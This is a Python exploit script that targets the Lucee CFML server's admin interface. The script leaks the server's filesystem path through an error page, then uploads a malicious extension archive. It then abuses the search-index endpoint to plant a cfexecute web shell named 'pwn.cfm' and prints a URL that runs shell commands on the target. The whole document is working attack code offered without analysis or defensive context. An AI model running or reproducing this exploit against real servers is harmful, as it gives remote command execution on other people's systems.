import requests,re,sys

target = sys.argv[1]
files = {'extfile': open('payload.lex', 'rb')}

paths = ["/lucee/admin/ext.applications.upload.cfm?sttext.ext.errorFileUpload&sttext.ext.theerror","/lucee/admin/nonExistentPath.cfm","/lucee/admin/admin.search.index.cfm?dataDir=fullpath/context/" + sys.argv[2] + "/&LUCEEARCHIVEZIPPATH=zip:///fullpath/temp/payload.lex"]

if (target):
    print(target+paths[1])
    r = requests.get(target+paths[1])
    if (r.status_code == 404):
        fullpath = re.search(r"\[/.*nonExistentPath\.cfm\.*\]",r.text)[0][:-34][1:]
        r = requests.post(target+paths[0], files=files,data={"mainAction":"uploadExt"})
        if r.status_code == 500:
            r = requests.get(target+paths[2].replace('fullpath',fullpath))
            if r.status_code == 200:
                r = requests.get(target+"/lucee/" + sys.argv[2] + "/searchindex.cfm?c=%3c%63%66%65%78%65%63%75%74%65%20%6e%61%6d%65%3d%23url.cmd%23%3e%3c%2f%63%66%65%78%65%63%75%74%65%3e&p=pwn.cfm")
                print(target+"/lucee/" + sys.argv[2] + "/pwn.cfm?cmd=id")
else:
    print("Give target")